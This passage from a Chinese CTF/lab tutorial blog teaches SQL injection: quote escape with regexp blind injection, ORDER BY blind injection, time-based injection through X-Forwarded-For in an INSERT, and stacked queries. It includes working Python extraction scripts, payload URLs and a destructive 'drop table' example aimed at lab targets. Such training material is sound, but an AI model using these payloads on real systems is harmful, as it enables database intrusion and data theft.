class="line"></span><br></pre></td></tr></table></figure>



<h3 id="例题实战"><a href="#例题实战" class="headerlink" title="例题实战"></a>例题实战</h3><p>简单请求发现存在<code>robots.txt</code>，请求后提示存在<code>hint.txt</code></p>
<p>提示中告诉了我们一个语句<code>select * from users where username=&#39;$_POST[&quot;username&quot;]&#39; and password=&#39;$_POST[&quot;password&quot;]&#39;;</code></p>
<p>并且成功注入出密码才可以得到flag</p>
<p>首先fuzz一下，看看过滤了哪些东西</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/20210126093916.png"></p>
<p>我们发现<code>单引号 双引号</code>被过滤了</p>
<p><code>union select</code>被过滤了</p>
<p><code>= like</code>也被过滤了</p>
<p>至此我们大部分的过滤思路都被限制了</p>
<p>根据注入语句这里我们想到单引号逃逸这个手段 </p>
<p>看fuzz结果，我们发现反斜杠没有被过滤，因此我们可以使用反斜杠将单引号转义，这要可以实现sql语句的逃逸</p>
<p>根据输入sql语句，假设<code>username</code>的值为<code>admin\</code>,密码是<code>or 1#</code>，那么这个语句的结果将会如下:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select username,password from user where username=&#x27;admin\&#x27; and password=&#x27; or 1#&#x27;</span><br></pre></td></tr></table></figure>

<p>这样由于单引号被转义， 其中的<code>and password=</code>这部分就成了<code>username</code>的一部分，<code>or 1</code>就逃逸了出来</p>
<p>直接尝试<code>regexp</code>盲注方式，构造payload为<code>password:or password regexp binary &#39;^A&#39;#</code></p>
<p>这里的<code>binary</code>关键字是用于区分大小写，由于直接 <code>regexp </code>匹配在 3.23.4 版本后是不分大小写</p>
<p>这里还由于过滤的单引号，所以对带入的匹配字符进行16进制加密</p>
<p>这边直接上脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/local/env python3</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="built_in">str</span> = [<span class="built_in">ord</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> string.printable]</span><br><span class="line">url = <span class="string">&quot;http://192.168.1.191:2333/index.php&quot;</span></span><br><span class="line">headers = &#123;</span><br><span class="line">	<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 F,irefox/52.0&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;close&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义字符串16进制转码函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ord2hex</span>(<span class="params"><span class="built_in">str</span></span>):</span></span><br><span class="line">	result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">		result += <span class="built_in">hex</span>(<span class="built_in">ord</span>(i))</span><br><span class="line">	result = result.replace(<span class="string">&#x27;0x&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">	<span class="keyword">return</span> <span class="string">&#x27;0x&#x27;</span>+result</span><br><span class="line">		</span><br><span class="line">temp = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):	</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">		password = ord2hex(<span class="string">&#x27;^&#x27;</span>+ temp + <span class="built_in">chr</span>(j))</span><br><span class="line">		<span class="comment">#print(password)</span></span><br><span class="line">		payload = <span class="string">&#x27;or password regexp binary &#123;&#125;#&#x27;</span></span><br><span class="line">		data = &#123;</span><br><span class="line">			<span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin\\&quot;</span>,</span><br><span class="line">			<span class="string">&quot;password&quot;</span>: payload.<span class="built_in">format</span>(password)</span><br><span class="line">		&#125; </span><br><span class="line">		r = requests.post(url = url, data = data, headers = headers, timeout= <span class="number">1</span>)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">&#x27;BJD need&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">			sys.stdout.write(<span class="built_in">chr</span>(j))</span><br><span class="line">			sys.stdout.flush()</span><br><span class="line">			temp += <span class="built_in">chr</span>(j)</span><br><span class="line">			<span class="keyword">break</span>	</span><br></pre></td></tr></table></figure>

<p>注入出密码为：<code>OhyOuFOuNdit</code></p>
<p>登录后直接获取<code>flag</code></p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/20210127112311.png"></p>
<h2 id="order-by盲注"><a href="#order-by盲注" class="headerlink" title="order by盲注"></a>order by盲注</h2><h3 id="order-by-子句"><a href="#order-by-子句" class="headerlink" title="order by 子句"></a>order by 子句</h3><p>作用：对查询返回的结果按一列或多列排序。</p>
<p>语法格式：<code>ORDER BY &#123;column_name [ASC|DASC]&#125;[,...n]</code></p>
<p>注意：<code>order by</code> 语句默认按照升序对记录进行排序</p>
<h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select id,username,password from users order by username,password desc;</span><br><span class="line">select id,username,password from users order by username;</span><br></pre></td></tr></table></figure>

<p>如果是按照列中的字符串来排序的话，是按照字符串的首字母以其在26字母表中的位置来排序的。<br>如果order by的后面有多个参数，则会先照第一个参数进行排序，如果在按照第一个参数排完序之后，其中有重复的，则这些重复的会再按照第二个参数进行排序</p>
<h3 id="order-by-盲注概念"><a href="#order-by-盲注概念" class="headerlink" title="order by 盲注概念"></a>order by 盲注概念</h3><p>根据不同的列排序，会返回不同的结果，因此这里可以使用类似于bool型盲注的形式来注入，即使判断结果与某种返回内容相关联，来实现注入。<br>(即：所谓的order by盲注就是以其排序结果为基准，来判断注入语句是否被成功执行，从而来进行暴力猜解)</p>
<h3 id="order-by常用盲注语句"><a href="#order-by常用盲注语句" class="headerlink" title="order by常用盲注语句"></a>order by常用盲注语句</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">select * from user order by id|(if(substr(database(),1,1)=&#x27;a&#x27;,1,2));</span><br><span class="line">当前数据库名称的首字母为a时id和2‘与’，否则和3‘与’。 （造成两种不同的排序）</span><br><span class="line">select * from user order by id|(if(substr(select flag from CTF),1,1)=&#x27;a&#x27;,1,2));</span><br><span class="line">表CTF中flag字段的首字母为a时id和2‘与’，否则和3‘与’。（造成两种不同的排序）</span><br><span class="line">select * from user order by id|&#123;select (select flag from level1_flag) regexp payload&#125;</span><br><span class="line">flag匹配成功和 1 “与”，匹配失败和 0 “与”。         （造成两种不同的排序）</span><br></pre></td></tr></table></figure>



<h3 id="sqlilab-less48"><a href="#sqlilab-less48" class="headerlink" title="sqlilab-less48"></a>sqlilab-less48</h3><p>请求传入<code>sort</code>变量,返回结果为查询的排序列表;输入不同查询<code>sort</code>,返回不同查询排序列表;</p>
<p><code>?sort=id</code></p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/20210127133019.png"></p>
<p><code>?sort=username</code></p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/20210127132939.png"></p>
<p>构造盲注语句，根据返回不同的排序列，猜解数据结果值；</p>
<p><code>?sort=id|(if((substr(database(),1,1)=&#39;s&#39;),1,2))</code>匹配返回标准排序结果</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/20210127133432.png"></p>
<p><code>?sort=id|(if((substr(database(),1,1)=&#39;a&#39;),1,2))</code>不匹配返回另外的排序结果</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/20210127133521.png"></p>
<p>根据上述情况，直接编写盲注脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/localenv python3</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://192.168.1.191:32769/Less-48/?sort=id&quot;</span></span><br><span class="line">headers = &#123;</span><br><span class="line">	<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 F,irefox/52.0&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;close&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">payloads = &#123;</span><br><span class="line">	<span class="string">&quot;dbname&quot;</span>: <span class="string">&quot;|(if((ascii(substr(database(),&#123;&#125;,1))=&#123;&#125;),1,2))&quot;</span>,</span><br><span class="line">	<span class="string">&quot;tbname&quot;</span>: <span class="string">&quot;|(if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 2,1),&#123;&#125;,1))=&#123;&#125;),1,2))&quot;</span>,</span><br><span class="line">	<span class="string">&quot;clname&quot;</span>: <span class="string">&quot;|(if((ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 2,1),&#123;&#125;,1))=&#123;&#125;),1,2))&quot;</span>,</span><br><span class="line">	<span class="string">&quot;clname&quot;</span>: <span class="string">&quot;|(if((ascii(substr((select username from users limit 2,1),&#123;&#125;,1))=&#123;&#125;),1,2))&quot;</span></span><br><span class="line">&#125; </span><br><span class="line">		</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):	</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>, <span class="number">128</span>):</span><br><span class="line">		payload = url + payloads[<span class="string">&#x27;clname&#x27;</span>].<span class="built_in">format</span>(i, j)</span><br><span class="line">		<span class="comment">#print(payload)</span></span><br><span class="line">		content1 = requests.get(url = url, headers = headers, timeout= <span class="number">1</span>).text</span><br><span class="line">		content2 = requests.get(url = payload, headers = headers, timeout= <span class="number">1</span>).text</span><br><span class="line">		<span class="keyword">if</span> content1 == content2:</span><br><span class="line">			sys.stdout.write(<span class="built_in">chr</span>(j))</span><br><span class="line">			sys.stdout.flush()</span><br><span class="line">			<span class="keyword">break</span></span><br></pre></td></tr></table></figure>





<h1 id="insert-into注入"><a href="#insert-into注入" class="headerlink" title="insert into注入"></a>insert into注入</h1><h2 id="语句基础"><a href="#语句基础" class="headerlink" title="语句基础"></a>语句基础</h2><p>INSERT INTO 语句用于向表中插入新记录。</p>
<h2 id="语法格式"><a href="#语法格式" class="headerlink" title="语法格式"></a>语法格式</h2><p>INSERT INTO 语句可以有两种编写形式。</p>
<p>第一种形式无需指定要插入数据的列名，只需提供被插入的值即可：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO table_name</span><br><span class="line">VALUES (value1,value2,value3,...);</span><br></pre></td></tr></table></figure>

<p>第二种形式需要指定列名及被插入的值：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO table_name (column1,column2,column3,...)</span><br><span class="line">VALUES (value1,value2,value3,...);</span><br></pre></td></tr></table></figure>



<h2 id="真题案例"><a href="#真题案例" class="headerlink" title="真题案例"></a>真题案例</h2><p>题目为<code>Bugku</code>中的一道<code>insert into</code>注入题。</p>
<h3 id="题目源码"><a href="#题目源码" class="headerlink" title="题目源码"></a>题目源码</h3><p>题目一开始给定了我们源码，并且<code>hint</code>中提示：写一个<code>python</code>脚本吧!</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	error_reporting(<span class="number">0</span>);</span><br><span class="line">	 </span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">getIp</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="variable">$ip</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]))&#123;</span><br><span class="line">		  <span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		 <span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line">	&#125;</span><br><span class="line">	   <span class="variable">$ip_arr</span> = explode(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$ip</span>);</span><br><span class="line">	   <span class="keyword">return</span> <span class="variable">$ip_arr</span>[<span class="number">0</span>];</span><br><span class="line">	   </span><br><span class="line">	&#125;</span><br><span class="line">	 </span><br><span class="line">	<span class="variable">$host</span>=<span class="string">&quot;localhost&quot;</span>;</span><br><span class="line">	<span class="variable">$user</span>=<span class="string">&quot;insert&quot;</span>;</span><br><span class="line">	<span class="variable">$pass</span>=<span class="string">&quot;1234qwer&quot;</span>;</span><br><span class="line">	<span class="variable">$db</span>=<span class="string">&quot;clientip&quot;</span>;</span><br><span class="line">	 </span><br><span class="line">	<span class="variable">$connect</span> = mysql_connect(<span class="variable">$host</span>, <span class="variable">$user</span>, <span class="variable">$pass</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Unable to connect&quot;</span>);</span><br><span class="line">	 </span><br><span class="line">	mysql_select_db(<span class="variable">$db</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Unable to select database&quot;</span>);</span><br><span class="line">	 </span><br><span class="line">	<span class="variable">$ip</span> = getIp();</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;your ip is :&#x27;</span>.<span class="variable">$ip</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;\r\n&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">	<span class="variable">$sql</span>=<span class="string">&quot;insert into client_ip (ip) values (&#x27;<span class="subst">$ip</span>&#x27;)&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$sql</span>;</span><br><span class="line">	mysql_query(<span class="variable">$sql</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>根据题目给定的源码可以发现注入点在<code>http</code>头的<code>x-forwarded-for</code>处;</p>
<p>且题目中过滤逗号，那么常规的<code>update</code>和报错注入和<code>if</code>语句都没法使用;</p>
<p>这里可以使用<code>select case when xxx then xxx else xxx end;</code>语句来代替<code>if</code>语句的使用;</p>
<p>题目中过滤了逗号，<code>substr</code>的中的逗号，可以使用<code>from x for x</code>的方式来替换;</p>
<h3 id="知识储备"><a href="#知识储备" class="headerlink" title="知识储备"></a>知识储备</h3><p><code>select case xxx  when xxx then xxx else xxx end;</code></p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/20210128093143.png"></p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/20210128094918.png"></p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>注入点是在<code>http</code>头的<code>x-forwarded-for</code>处;</p>
<p>payload:<code>+&#39; and (select case  when (length(database())=8) then sleep(5) else 1 end) and &#39;1&#39;=&#39;1</code></p>
<p>延时5秒响应</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/20210128100811.png"></p>
<p>payload:<code>+&#39; and (select case  when (length(database())=5) then sleep(5) else 1 end) and &#39;1&#39;=&#39;1</code></p>
<p>没有延时直接响应</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128104911961.png" alt="image-20210128104911961"></p>
<p>根据上诉返回情况，我们可以根据页面的响应的时间不通过，对其内容进行逐一猜解，脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/localenv python3</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">URL = <span class="string">&quot;http://192.168.1.191:32771/&quot;</span></span><br><span class="line">PAYLOADS = &#123;</span><br><span class="line">	<span class="string">&quot;dbname&quot;</span>: <span class="string">&quot;&#x27;+(select case  when (ascii(substr(database() from &#123;&#125; for 1))&gt;&#123;&#125;) then sleep(3) else 1 end) and &#x27;1&#x27;=&#x27;1&quot;</span>,</span><br><span class="line">	<span class="string">&quot;tbname&quot;</span>: <span class="string">&quot;&#x27;+(select case  when (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1 offset 1) from &#123;&#125; for 1))&gt;&#123;&#125;) then sleep(3) else 1 end) and &#x27;1&#x27;=&#x27;1&quot;</span>,</span><br><span class="line">	<span class="string">&quot;clname&quot;</span>: <span class="string">&quot;&#x27;+(select case  when (ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;flag&#x27; limit 1 offset 0) from &#123;&#125; for 1))&gt;&#123;&#125;) then sleep(3) else 1 end) and &#x27;1&#x27;=&#x27;1&quot;</span>,</span><br><span class="line">	<span class="string">&quot;clcontent&quot;</span>: <span class="string">&quot;&#x27;+(select case  when (ascii(substr((select flag from flag) from &#123;&#125; for 1))&gt;&#123;&#125;) then sleep(3) else 1 end) and &#x27;1&#x27;=&#x27;1&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_url_request</span>(<span class="params">url, final_payload</span>):</span></span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		result = requests.get(url = url, headers = final_payload, timeout = <span class="number">5</span>).elapsed.total_seconds()</span><br><span class="line">	<span class="keyword">except</span> TimeoutError <span class="keyword">as</span> e:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;请求超时。。。&quot;</span>)</span><br><span class="line">	<span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="comment"># 二分法</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">merge_serach</span>(<span class="params">url, payload</span>):</span></span><br><span class="line">	<span class="comment"># 定义循环数据列表</span></span><br><span class="line">	range_list = [x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">128</span>)]</span><br><span class="line">	<span class="built_in">min</span> = <span class="number">0</span>                               <span class="comment">#代表列表下标的起始值</span></span><br><span class="line">	<span class="built_in">max</span> = <span class="built_in">len</span>(range_list) - <span class="number">1</span>             <span class="comment">#代表列表下标的结束值</span></span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		mid = (<span class="built_in">max</span> + <span class="built_in">min</span>) // <span class="number">2</span>            <span class="comment">#获取列表下标的中间值</span></span><br><span class="line">		<span class="comment">#定义最终payload格式</span></span><br><span class="line">		headers = &#123;</span><br><span class="line">			<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 F,irefox/52.0&#x27;</span>,</span><br><span class="line">			<span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#x27;</span>,</span><br><span class="line">			<span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;close&#x27;</span>,</span><br><span class="line">			<span class="string">&#x27;x-forwarded-for&#x27;</span>: payload.<span class="built_in">format</span>(mid)</span><br><span class="line">		&#125;</span><br><span class="line">		final_payload = headers</span><br><span class="line">		<span class="comment">#print(final_payload[&#x27;x-forwarded-for&#x27;])</span></span><br><span class="line">		<span class="comment"># 判断页面响应时间获取字符结果</span></span><br><span class="line">		result = get_url_request(url, final_payload)</span><br><span class="line">		<span class="keyword">if</span> result &gt; <span class="number">2</span>:</span><br><span class="line">			<span class="built_in">min</span> = mid</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="built_in">max</span> = mid</span><br><span class="line">		<span class="keyword">if</span> <span class="built_in">min</span> == <span class="built_in">max</span> - <span class="number">1</span>:</span><br><span class="line">			<span class="keyword">if</span> result &gt; <span class="number">2</span>:</span><br><span class="line">				<span class="keyword">return</span> <span class="built_in">max</span></span><br><span class="line">			<span class="keyword">return</span> <span class="built_in">min</span>+<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span>	</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">50</span>):	</span><br><span class="line">		payload = PAYLOADS[<span class="string">&#x27;clcontent&#x27;</span>].<span class="built_in">format</span>(i, <span class="string">&#x27;&#123;&#125;&#x27;</span>)</span><br><span class="line">		result = merge_serach(URL, payload)</span><br><span class="line">		sys.stdout.write(<span class="built_in">chr</span>(result))</span><br><span class="line">		sys.stdout.flush()</span><br><span class="line">	</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>运行结果如下：</p>
<h1 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h1><h2 id="堆叠注入原理"><a href="#堆叠注入原理" class="headerlink" title="堆叠注入原理"></a>堆叠注入原理</h2><p>堆叠注入和<code>uinon</code>联合注入有异曲同工之妙，用法类似，只是不需要堆叠注入使用的<code>；</code>结束前面的<code>sql</code>语句：</p>
<p>在使用<code>；</code>(分号)结束一个<code>sql</code>语句后，可以继续构造下一条<code>sql</code>语句；</p>
<p><code>select * from admin;drop table admin;</code>//执行这个语句先查询<code>admin</code>表内容，后删除<code>admin</code>表；</p>
<h2 id="堆叠注入的优缺点"><a href="#堆叠注入的优缺点" class="headerlink" title="堆叠注入的优缺点"></a>堆叠注入的优缺点</h2><p>优点：</p>
<p>使用union联合注入时，须保证前后两个sql语句的可显示字段数量要相同，使用堆叠注入则不需要考虑这个限制，其可以执行任意语句；</p>
<p>缺点：</p>
<p>堆叠注入并不是每个环境下都可以执行，有可能会受到api或者数据库引擎不支持的限制；</p>
<p>目前已知支持堆叠注入的有：</p>
<table>
<thead>
<tr>
<th>asp</th>
<th>sql  server</th>
</tr>
</thead>
<tbody><tr>
<td>ASP.NET</td>
<td>SQL  SERVER</td>
</tr>
<tr>
<td>PHP</td>
<td>SQL  SERVER MYSQL</td>
</tr>
</tbody></table>
<h2 id="堆叠注入的利用-sqlilab-less38"><a href="#堆叠注入的利用-sqlilab-less38" class="headerlink" title="堆叠注入的利用(sqlilab-less38)"></a>堆叠注入的利用(sqlilab-less38)</h2><p>带入单引号，数据返回错误信息，判断当前存在注入点</p>
<p><code>http://192.168.2.220:8080/Less-38/?id=-1&#39;</code></p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128145525282.png" alt="image-20210128145525282"></p>
<p>使用<code>order by</code>判断字段位数</p>
<p>当带入的值为3时，页面响应正常</p>
<p><code>http://192.168.2.220:8080/Less-38/?id=1&#39;order by 3--+</code></p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128145613197.png" alt="image-20210128145613197"></p>
<p>当带入的值为4时，页面响应异常，判断判断当前表中字段长度为3</p>
<p><code>http://192.168.2.220:8080/Less-38/?id=1&#39;order by 4--+</code></p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128145657274.png" alt="image-20210128145657274"></p>
<p>使用联合查询获取所有库名</p>
<p><code>http://192.168.2.220:8080/Less-38/?id=-1&#39; union select 1,group_concat(schema_name),2 from information_schema.schemata --+</code></p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128145734590.png" alt="image-20210128145734590"></p>
<p>新增库判断是否存在堆叠注入</p>
<p><code>http://192.168.2.220:8080/Less-38/?id=-1&#39;;create database duidietest--+</code></p>
<p>利用查库重新获取当前mysql的所有库名，发现新增库名成功，则判断是堆叠注入</p>
<p><code>http://192.168.2.220:8080/Less-38/?id=-1&#39; union select 1,group_concat(schema_name),2 from information_schema.schemata --+</code></p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128145837778.png" alt="image-20210128145837778"></p>
<h2 id="真题环境复现-强网杯2019-随便注"><a href="#真题环境复现-强网杯2019-随便注" class="headerlink" title="真题环境复现(强网杯2019-随便注)"></a>真题环境复现(强网杯2019-随便注)</h2><h3 id="环境复现"><a href="#环境复现" class="headerlink" title="环境复现"></a>环境复现</h3><p><code>cd sql_injection_qw2019_stacked</code> </p>
<p><code>docker-compose up -d</code></p>
<h3 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h3><p>提交框带入单引号，返回报错语句，判断存在注入；</p>
